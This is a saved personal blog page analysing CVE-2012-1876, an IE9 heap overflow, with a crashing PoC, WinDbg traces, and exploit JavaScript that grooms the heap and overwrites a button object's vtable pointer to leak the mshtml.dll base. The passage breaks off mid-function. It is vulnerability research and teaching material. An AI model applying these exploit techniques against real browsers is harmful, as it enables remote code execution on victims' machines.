<!DOCTYPE html>
<!-- saved from url=(0037)http://#/archives/201.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="https://lib.baomitu.com/">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>CVE-2012-1876分析 - lZeroyuee's Blog</title>
    <!-- Favicon -->
    <link rel="shortcut icon" href="http://lzeroyuee.cn/usr/uploads/2020/05/1330681747.png">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <!-- AmazeUI 3.0 -->
    <link rel="stylesheet" href="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/amazeui.min.css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/customui.min.css">
    <!-- CodeHighlight -->
    <style>
    .hljs{display:block;overflow-x:auto;padding:0.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;}.hljs-doctag,.hljs-keyword,.hljs-formula{color:#a626a4}.hljs-section,.hljs-name,.hljs-selector-tag,.hljs-deletion,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-string,.hljs-regexp,.hljs-addition,.hljs-attribute,.hljs-meta-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-variable,.hljs-template-variable,.hljs-type,.hljs-selector-class,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-number{color:#986801}.hljs-symbol,.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:bold}.hljs-link{text-decoration:underline}
    </style>
    <!-- FontAwesome -->
    <link href="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/font-awesome.min.css" rel="stylesheet">
    <!-- 通过自有函数输出HTML头部信息 -->
    <meta name="description" content="简介CVE-2012-1876是法国安全团队Vupen在Pwn2Own 2012上攻破Win7下IE9的两个漏洞之一，利用了标签生成时的堆溢出漏洞PoC分析分析过程&amp;lt;html&amp;gt; &amp;l...">
<meta name="generator" content="Typecho 1.2/19.05.09">
<meta name="template" content="amaze">
<link rel="pingback" href="http://#/action/xmlrpc">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://#/action/xmlrpc?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://#/action/xmlrpc?wlw">
<link rel="alternate" type="application/rss+xml" title="CVE-2012-1876分析 » lZeroyuee&#39;s Blog » RSS 2.0" href="http://#/feed/archives/201.html">
<link rel="alternate" type="application/rdf+xml" title="CVE-2012-1876分析 » lZeroyuee&#39;s Blog » RSS 1.0" href="http://#/feed/rss/archives/201.html">
<link rel="alternate" type="application/atom+xml" title="CVE-2012-1876分析 » lZeroyuee&#39;s Blog » ATOM 1.0" href="http://#/feed/atom/archives/201.html">
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-201'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-201'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
        load: 'onload'
    }, added = false;

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-201'),
            input = document.createElement('input');
        input.type = 'hidden';
        input.name = '_';
        input.value = (function () {
    var _2hEcSc = //'d'
'10b'+'a45'//'u'
+'f'//'Z'
+''///*'Gv'*/'Gv'
+//'ox'
'755'+'f60'//'r4'
+//'3z'
'fd'+//'R'
'4'+'ee'//'Nd'
+//'d'
'd'+//'v09'
'2'+//'XH6'
'dd'+'68'//'B'
+'5'//'tK2'
+//'5ik'
'a1'+//'e'
'86'+//'q8t'
'q8t'+//'2z'
'3e'+//'D'
'e'+'c'//'BA2'
, _Admv = [[18,19],[28,31]];
    
    for (var i = 0; i < _Admv.length; i ++) {
        _2hEcSc = _2hEcSc.substring(0, _Admv[i][0]) + _2hEcSc.substring(_Admv[i][1]);
    }

    return _2hEcSc;
})();

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                function append() {
                    if (!added) {
                        forms[0].appendChild(input);
                        added = true;
                    }
                }
            
                for (var i = 0; i < event.triggers.length; i ++) {
                    var trigger = event.triggers[i];
                    document[event.add](trigger, append);
                    window[event.add](trigger, append);
                }
            }
        }
    });
})();
</script><link rel="stylesheet" href="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/APlayer.min.css">
<script type="text/javascript" src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/APlayer.min.js.下载"></script>
<script>var meting_api="http://#/action/metingapi?server=:server&type=:type&id=:id&auth=:auth&r=:r";</script></head>

<body id="blog">
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="http://#/">lZeroyuee's Blog</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="http://lzeroyuee.cn/">Home</a>
                    </li>
                                                            <li>
                        <a href="http://lzeroyuee.cn/archives">归档</a>
                    </li>
                                        <li>
                        <a href="http://lzeroyuee.cn/about/">关于我</a>
                    </li>
                                                        </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <header class="intro-header" style="background-image: url(&#39;&#39;)">
    <div class="container">
        <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>CVE-2012-1876分析</h1>
                        <span class="meta">@lzeroyuee &nbsp;November 21, 2020</span>
                        <div class="tags post-tags"><a href="http://#/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;</div>
                    </div>
                </div>
        </div>
    </div>
    </header>

    <!-- content start -->
    <div class="container">
    <div class="am-g am-g-fixed blog-fixed">
        <div class="am-u-lg-12 am-u-sm-12">
            <article class="am-article blog-article-p article-trigger">
                <div id="post-content" class="am-article-bd">
                    <h2 id="directory059046285320384231">简介</h2><p>CVE-2012-1876是法国安全团队Vupen在Pwn2Own 2012上攻破Win7下IE9的两个漏洞之一，利用了标签生成时的堆溢出漏洞</p><h2 id="directory059046285320384232">PoC分析</h2><h3 id="directory059046285320384233">分析过程</h3><pre><code class="lang-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"table-layout:fixed"</span> &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"132"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"41"</span> <span class="hljs-attr">span</span>=<span class="hljs-string">"1"</span> &gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">over_trigger</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">var</span> obj_col = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"132"</span>);
        obj_col.width = <span class="hljs-string">"42765"</span>;
        obj_col.span = <span class="hljs-number">1000</span>;
 }
 
 setTimeout(<span class="hljs-string">"over_trigger();"</span>,<span class="hljs-number">1</span>);
 
 </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>对堆调试，需要先开启页堆调试支持</p><pre><code class="lang-shell hljs">gflags.exe -i iexplore.exe +hpa</code></pre><p>然后附加到IE进程，由于此漏洞触发在IE的子进程下，需额外开启对子进程的调试支持</p><pre><code class="hljs cs"><span class="hljs-comment">// 开启子进程调试支持</span>
<span class="hljs-number">0</span>:<span class="hljs-number">015</span>&gt; .childdbg <span class="hljs-number">1</span>
Processes created <span class="hljs-keyword">by</span> the current process will be debugged</code></pre><p>接着打开PoC，启用<code>ActiveX</code>控件，会触发访问异常</p><pre><code class="hljs makefile"><span class="hljs-section">(534.8dc): Access violation - code c0000005 (first chance)</span>
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=04d55000 edi=04d55018
eip=6795f167 esp=0410d9d0 ebp=0410d9dc iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
<span class="hljs-section">mshtml!CTableColCalc::AdjustForCol+0x15:</span>
6795f167 890f            mov     dword ptr [edi],ecx  ds:0023:04d55018=????????</code></pre><p>利用栈回溯，异常触发于<code>mshtml!CTableColCalc::AdjustForCol+0x15</code>处</p><pre><code class="hljs css">1<span class="hljs-selector-pseudo">:020</span>&gt; <span class="hljs-selector-tag">kb</span>
<span class="hljs-selector-tag">ChildEBP</span> <span class="hljs-selector-tag">RetAddr</span>  <span class="hljs-selector-tag">Args</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">Child</span>              
0410<span class="hljs-selector-tag">d9dc</span> 677<span class="hljs-selector-tag">d5b8e</span> 00414114 0410<span class="hljs-selector-tag">dd20</span> 00000001 <span class="hljs-selector-tag">mshtml</span>!<span class="hljs-selector-tag">CTableColCalc</span><span class="hljs-selector-pseudo">::AdjustForCol+0x15</span>
0410<span class="hljs-selector-tag">da8c</span> 67640713 00000001 0410<span class="hljs-selector-tag">dd20</span> 000003<span class="hljs-selector-tag">e8</span> <span class="hljs-selector-tag">mshtml</span>!<span class="hljs-selector-tag">CTableLayout</span><span class="hljs-selector-pseudo">::CalculateMinMax+0x52f</span>
0410<span class="hljs-selector-tag">dca8</span> 6762<span class="hljs-selector-tag">af19</span> 0410<span class="hljs-selector-tag">dd20</span> 0410<span class="hljs-selector-tag">dcec</span> 00000001 <span class="hljs-selector-tag">mshtml</span>!<span class="hljs-selector-tag">CTableLayout</span><span class="hljs-selector-pseudo">::CalculateLayout+0x276</span>
0410<span class="hljs-selector-tag">de54</span> 6771<span class="hljs-selector-tag">cc48</span> 0410<span class="hljs-selector-tag">f4c8</span> 0410<span class="hljs-selector-tag">e080</span> 00000000 <span class="hljs-selector-tag">mshtml</span>!<span class="hljs-selector-tag">CTableLayout</span><span class="hljs-selector-pseudo">::CalcSizeVirtual+0x720</span>
0410<span class="hljs-selector-tag">df8c</span> 6770<span class="hljs-selector-tag">f5d0</span> 0757<span class="hljs-selector-tag">dea8</span> 00000000 00000000 <span class="hljs-selector-tag">mshtml</span>!<span class="hljs-selector-tag">CLayout</span><span class="hljs-selector-pseudo">::CalcSize+0x2b8</span>
...</code></pre><p>在<code>mshtml!CTableColCalc::AdjustForCol</code>中，<code>edi</code>的值由<code>esi</code>决定，而<code>esi</code>在此函数中是直接引用的，需要找其调用者</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/1196330731.png" alt="1.png" title="1.png"></p><p>重新调试，对<code>mshtml!CTableLayout::CalculateMinMax</code>下断点</p><p><strong>注</strong>：命令<code>sxe ld:mshtml</code>使得当<code>mshtml</code>模块加载时断下</p><p>在此函数断下后，单步调试，辅助IDA静态分析</p><pre><code class="hljs makefile">    Breakpoint 1 hit
eax=ffffffff ebx=06b02ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=042fe5bc
eip=6764018a esp=042fe360 ebp=042fe578 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
<span class="hljs-section">mshtml!CTableLayout::CalculateMinMax:</span>
6764018a 8bff            mov     edi,edi</code></pre><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/836754114.png" alt="2.png" title="2.png"></p><p>而后在<code>CImplAry::EnsureSizeWorker</code>分配堆内存</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/2307026125.png" alt="3.png" title="3.png"></p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/1954008581.png" alt="4.png" title="4.png"></p><p>根据以上信息，可知</p><ul><li><code>CTableLayout + 0x9C</code>为分配的堆内存首地址，且大小至少为<code>4 * 0x1C = 0x70</code></li><li><code>CTableLayout + 0x54</code>为<code>snap</code></li><li><code>CTableLayout + 0x94</code>为<code>snap_cmp</code>，要满足<code>snap_cmp / 4 &lt; snap</code>，才分配堆内存</li></ul><p>在PoC中执行<code>over_trigger</code>函数，再次继续调试运行，在第四次断下时，就触发了异常，着重调试第三次</p><p>在<code>over_trigger</code>函数中，没有对标签的<code>snap</code>字段进行修改，后续<code>snap_cmp = 4, snap_cmp / 4 = 1 == snap</code>，不会再分配堆内存</p><pre><code class="hljs makefile">// 第三次断下
<span class="hljs-section">1:021&gt; g</span>
Breakpoint 1 hit
eax=ffffffff ebx=06fdaea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=03f7e084
eip=6764018a esp=03f7de28 ebp=03f7e040 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
<span class="hljs-section">mshtml!CTableLayout::CalculateMinMax:</span>
6764018a 8bff            mov     edi,edi
<span class="hljs-section">1:021&gt; dd ebx + 54</span>
06fdaefc  00000001 ffffffff ffffffff ffffffff
06fdaf0c  ffffffff 67539fd0 00000004 00000004
06fdaf1c  0553aff0 67539fd0 00000004 00000004
06fdaf2c  07071ff0 00000000 00000000 67539fd0
06fdaf3c  00000004 00000004 05734f90 00000000
06fdaf4c  00000000 00000000 00000000 00000000
06fdaf5c  00000000 00000000 00000000 000000c8
06fdaf6c  000000c8 00000000 00000000 00000000
<span class="hljs-section">1:021&gt; dd ebx + 94</span>
06fdaf3c  00000004 00000004 05734f90 00000000
06fdaf4c  00000000 00000000 00000000 00000000
06fdaf5c  00000000 00000000 00000000 000000c8
06fdaf6c  000000c8 00000000 00000000 00000000
06fdaf7c  00000000 00000000 00000000 00000001
06fdaf8c  00000000 00000000 00000000 00000000
06fdaf9c  00000000 00000000 00000000 00000000
06fdafac  00000000 ffffffff 00000001 00000000

// 第四次断下
<span class="hljs-section">1:022&gt; g</span>
<span class="hljs-section">(ee8.cd4): Access violation - code c0000005 (first chance)</span>
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=074bb000 edi=074bb018
eip=6795f167 esp=042fdab8 ebp=042fdac4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
<span class="hljs-section">mshtml!CTableColCalc::AdjustForCol+0x15:</span>
6795f167 890f            mov     dword ptr [edi],ecx  ds:0023:074bb018=????????</code></pre><p>在PoC的<code>over_trigger</code>函数中将<code>obj_col.span</code>的值修改为1000，单步调试到<code>mshtml!CTableCol::GetAAspan</code></p><pre><code class="hljs makefile"><span class="hljs-section">1:022&gt; p</span>
eax=058fcfd0 ebx=0706bea8 ecx=00000031 edx=00000000 esi=07510fac edi=058fcfd0
eip=677d5a2e esp=03f9ded8 ebp=03f9df74 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
<span class="hljs-section">mshtml!CTableLayout::CalculateMinMax+0x37e:</span>
677d5a2e e8d445dfff      call    mshtml!CTableCol::GetAAspan (675ca007)
<span class="hljs-section">1:022&gt; p</span>
eax=000003e8 ebx=0706bea8 ecx=00000002 edx=06df6ff0 esi=07510fac edi=058fcfd0
eip=677d5a33 esp=03f9ded8 ebp=03f9df74 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
<span class="hljs-section">mshtml!CTableLayout::CalculateMinMax+0x383:</span>
677d5a33 3de8030000      cmp     eax,3E8h</code></pre><p>此时获取到的值为1000，继续向下单步分析，获取了PoC中的<code>obj_col.width</code>字段，转为<code>DWORD</code>型后又乘了100，即<code>obj_col.width * 100</code></p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/2654687370.png" alt="5.png" title="5.png"></p><p>之后会进入循环，循环次数为<code>obj_col.span</code>次，且每次堆内存指针都向前移动<code>0x1c</code>字节，最终当指针向前移动了<code>0x70</code>字节时，在<code>CTableColCalc::AdjustForCol</code>函数中发送堆溢出（<code>0x70</code>字节也刚好是最开始分配的堆内存大小）</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/1268467530.png" alt="6.png" title="6.png"></p><pre><code class="hljs makefile"><span class="hljs-section">1:020&gt; t</span>
eax=07734f80 ebx=04e5eea8 ecx=00000070 edx=00004141 esi=074e8000 edi=00000001
eip=677d5b89 esp=041fdf1c ebp=041fdfc4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
<span class="hljs-section">mshtml!CTableLayout::CalculateMinMax+0x52a:</span>
677d5b89 e8c4951800      call    mshtml!CTableColCalc::AdjustForCol (6795f152)

<span class="hljs-section">1:020&gt; !heap -p -a 074e8000-70</span>
    address 074e7f90 found in
    _DPH_HEAP_ROOT @ 151000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 7730f08:          74e7f90               70 -          74e7000             2000</code></pre><p>接着进入<code>CTableColCalc::AdjustForCol</code>函数，会对<code>heap_buf_ptr + 0x18</code>处进行赋值，结合外层的循环，可以看出这里是循环对堆内存进行赋值，最终由于<code>obj_col.span * 0x1c 远大于 0x70</code>导致堆溢出</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/1046169213.png" alt="7.png" title="7.png"></p><pre><code class="hljs makefile"><span class="hljs-section">1:020&gt; p</span>
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=074e8000 edi=074e8018
eip=6795f167 esp=041fdf08 ebp=041fdf14 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
<span class="hljs-section">mshtml!CTableColCalc::AdjustForCol+0x15:</span>
6795f167 890f            mov     dword ptr [edi],ecx  ds:0023:074e8018=????????
<span class="hljs-section">1:020&gt; g</span>
<span class="hljs-section">(cb0.bb8): Access violation - code c0000005 (!!! second chance !!!)</span>
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=074e8000 edi=074e8018
eip=6795f167 esp=041fdf08 ebp=041fdf14 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
<span class="hljs-section">mshtml!CTableColCalc::AdjustForCol+0x15:</span>
6795f167 890f            mov     dword ptr [edi],ecx  ds:0023:074e8018=????????</code></pre><h3 id="directory059046285320384234">总结</h3><ol><li>页面加载阶段，在<code>CTableLayout::CalculateMinMax</code>函数中，<code>snap</code>属性的值为1，<code>snap_cmp</code>为0</li><li><code>snap_cmp / 4 &lt; snap</code>，所以在<code>CImplAry::EnsureSizeWorker</code>函数中分配堆内存，大小为<code>snap * 0x1c</code>且最小大小为<code>4 * 0x1c = 0x70</code></li><li>分配完堆内存后，有<code>snap_cmp = 4, snap_cmp / 4 = 1 == snap</code>，因此后续不会再分配堆内存</li><li>调用了PoC的<code>over_trigger</code>函数，会再次调用<code>CTableLayout::CalculateMinMax</code>函数，此时<code>snap</code>和<code>snap_cmp</code>没有改变，<code>obj_col.span</code>的值为1000，<code>obj_col.span</code>会作为计数器，循环向分配的堆内存中写入数据，而<code>obj_col.span * 0x1c 远大于 0x70</code>，故造成堆溢出</li></ol><h2 id="directory059046285320384235">Exp简要分析</h2><p>构造堆布局，泄露mshtml.dll基址，以便绕过ASRL</p><pre><code class="lang-javascript hljs"><span class="hljs-keyword">var</span> free = <span class="hljs-string">"EEEE"</span>;
<span class="hljs-keyword">while</span> (free.length &lt; <span class="hljs-number">480</span>) free += free;
<span class="hljs-keyword">var</span> string1 = <span class="hljs-string">"AAAA"</span>;
<span class="hljs-keyword">while</span> (string1.length &lt; <span class="hljs-number">480</span>) string1 += string1;
<span class="hljs-keyword">var</span> string2 = <span class="hljs-string">"BBBB"</span>;
<span class="hljs-keyword">while</span> (string2.length &lt; <span class="hljs-number">480</span>) string2 += string2;
<span class="hljs-keyword">var</span> fr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
<span class="hljs-keyword">var</span> al = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
<span class="hljs-keyword">var</span> div_container = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"evil"</span>);
div_container.style.cssText = <span class="hljs-string">"display:none"</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">500</span>; i+=<span class="hljs-number">2</span>) {
    fr[i] = free.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);
    al[i] = string1.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);
    al[i+<span class="hljs-number">1</span>] = string2.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"button"</span>);
    div_container.appendChild(obj);
}
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">200</span>; i &lt; <span class="hljs-number">500</span>; i += <span class="hljs-number">2</span>) {
    fr[i] = <span class="hljs-literal">null</span>;
    CollectGarbage();
}</code></pre><p>以上这段先分配了250次堆内存，每次都申请了100字节的"EEEE……"、"AAAA……"、"BBBB……"、和<code>CButtonLayout</code>，布局如下图：</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/3255167655.png" alt="8.png" title="8.png"></p><p>其中对于<code>(0x100 - 6) / 2</code>的含义是计算出所占内存大小<code>0x100</code>字节的子串末尾索引，这里的JavaScript的字符串采用的是宽字节编码，故最后要除以2，而减去6是因为在浏览器中，JavaScript的字符串上有<strong>4字节</strong>的字符串长度和<strong>2字节</strong>的<code>NULL</code>结尾标志，如下：</p><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/892121958.png" alt="9.png" title="9.png"></p><p>这类字符串即是BSTR字符串（Pascal-Style字符串）</p><p>之后从中间开始间接释放内存<code>fr[i]</code>，即字符串"EEEE……"的部分，选择这里释放的位置是为了让后续触发漏洞时的堆内存占据这些被释放的位置中的一个，顺而可以溢出淹没后续"AAAA……"、"BBBB……"</p><p>紧接着创建多个col标签，这些标签的<code>snap = 9</code>，<code>snap * 0x1c =0xfc </code>对齐之后是<code>0x100</code></p><pre><code class="lang-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"table-layout:fixed"</span> &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"41"</span> <span class="hljs-attr">span</span>=<span class="hljs-string">"9"</span> &gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
...
...
<span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"table-layout:fixed"</span> &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"132"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"41"</span> <span class="hljs-attr">span</span>=<span class="hljs-string">"9"</span> &gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><p>在堆释放时，最终会调用<code>RtlFreeHeap</code>，在这个函数上下断点，即可看到释放时的堆内存</p><p>查看创建的堆内存，对<code>CImplAry::EnsureSizeWorker</code>的下一条指令下断点，然后<code>ebx + 9c</code>即是堆内存首地址</p><pre><code class="hljs cpp">bp jscript!JsCollectGarbage    <span class="hljs-comment">// 先在此处断下，然后设置以下断点</span>
bu ntdll!RtlFreeHeap <span class="hljs-string">".echo free heap;db poi(esp+c) l10;g"</span>
bu mshtml!CTableLayout::CalculateMinMax+<span class="hljs-number">0x16d</span> <span class="hljs-string">".echo vulheap; dd poi(ebx+9c) l4;g"</span>
.logopen /t c:\logs\mylogfile.txt</code></pre><p>运行起来，可以看到后续申请的堆空间占据了释放的位置</p><pre><code class="hljs css">...
<span class="hljs-selector-tag">free</span> <span class="hljs-selector-tag">heap</span>
03<span class="hljs-selector-tag">f75240</span>  <span class="hljs-selector-tag">fa</span> 00 00 00 45 00 45 00<span class="hljs-selector-tag">-45</span> 00 45 00 45 00 45 00  ...<span class="hljs-selector-class">.E</span><span class="hljs-selector-class">.E</span><span class="hljs-selector-class">.E</span><span class="hljs-selector-class">.E</span><span class="hljs-selector-class">.E</span><span class="hljs-selector-class">.E</span>.
...
<span class="hljs-selector-tag">vulheap</span>
03<span class="hljs-selector-tag">f75240</span>  0000054<span class="hljs-selector-tag">b</span> 00450045 00450045 00450045</code></pre><p>而后，<code>col.span = 19</code>，也即<code>19 * 0x1c = 0x214</code>，因在堆块开头有8字节的<code>_HEAP_ENTRY</code>结构，所以可以覆盖到后续的字符串长度与<code>CButtonLayout</code>的开头4字节的虚表指针</p><pre><code class="lang-javascript hljs"><span class="hljs-keyword">var</span> leak_col = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"132"</span>);
leak_col.width = <span class="hljs-number">41</span>;
leak_col.span = <span class="hljs-number">19</span>;</code></pre><p><img src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/1965580554.png" alt="10.png" title="10.png"></p><p>故，后续执行泄露函数<code>get_leak</code>，通过<code>CButtonLayout.vftable</code>与<code>mshtml.dll</code>的偏移是固定值，由此泄露出<code>mshtml.dll</code>的基址，后续可利用同样的方式，覆盖到<code>CButtonLayout.vftable</code>，利用ROP与堆喷射，将流程转向shellcode上</p><pre><code class="lang-javascript hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_leak</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">500</span>; i++) {
        <span class="hljs-comment">// 寻找长度大于(0x100-6)/2的字符串，这里就是被覆盖过的</span>
        <span class="hljs-keyword">if</span> (al[i].length &gt; (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>) {
            <span class="hljs-comment">// 取得CButtonLayout的虚表指针所在的位置，获取该位置的地址值</span>
